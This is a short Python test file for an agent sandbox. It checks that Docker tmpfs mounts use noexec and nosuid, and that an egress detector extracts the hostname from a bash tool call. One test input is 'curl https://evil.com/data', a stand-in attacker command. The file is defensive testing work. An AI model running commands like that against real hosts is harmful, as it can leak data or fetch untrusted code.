from __future__ import annotations

import pytest


def test_tmpfs_noexec():
    """Verify that tmpfs options contain noexec and not exec."""
    import importlib
    import inspect
    import claw.sandbox.docker_runner as dr

    source = inspect.getsource(dr)
    # noexec must be present
    assert "noexec" in source, "noexec flag missing from docker_runner tmpfs config"
    # bare 'exec' mount option must not appear (the string 'exec' may appear in 'noexec', that's fine)
    # Check that the old pattern ',exec"' or 'size=...m,exec' is gone
    assert ",exec\"" not in source, "exec mount flag still present in docker_runner tmpfs config"
    assert "nosuid" in source, "nosuid flag missing from docker_runner tmpfs config"


def test_bash_egress_detection():
    """_infer_egress_dest should detect curl with URL and return the hostname."""
    from claw.agent.loop import _infer_egress_dest

    result = _infer_egress_dest("bash", {"command": "curl https://evil.com/data"})
    assert result == "evil.com", f"Expected 'evil.com', got {result!r}"
